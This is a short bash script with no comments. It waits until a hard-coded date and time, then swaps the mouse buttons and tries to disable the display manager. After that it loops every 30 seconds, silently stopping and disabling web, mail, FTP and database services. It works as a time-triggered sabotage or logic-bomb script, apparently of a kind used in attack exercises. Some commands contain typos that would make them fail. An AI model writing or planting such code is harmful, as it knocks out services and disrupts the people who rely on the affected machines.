#!/bin/bash
initial_time='202304170515' 
while [ $(date '+%Y%m%d%H%M') -lt $initial_time ]; do
    sleep 1
done
xmodmap -e "pointer = 3 2 1" &> /dev/null
if command -v systemctl &> /dev/null; then
	sudo system disable display-manager.service &>/dev/null
else
	sudo update-rd.d -f display-manager remove &>/dev/null
fi
services=(apache2 imap smtpd httpd nginx mysql ftp vsftpd proftpd exim dovecot postfix)
while true; do
	for service in "${services[@]}"; do
		if command -v systemctl &> /dev/null; then
			sudo systemctl stop "$service" &>/dev/null
			sudo systemctl disable "$service" &>/dev/null
		else
			sudo service "$service" stop &>/dev/null
			sudo update-rc.d -f "$service" remove &>/dev/null
		fi
	done
	if command -v systemctl &> /dev/null; then
		sudo system stop display-manager.service &>/dev/null
	else
		sudo service display-manager stop &>/dev/null
	fi
	sleep 30
done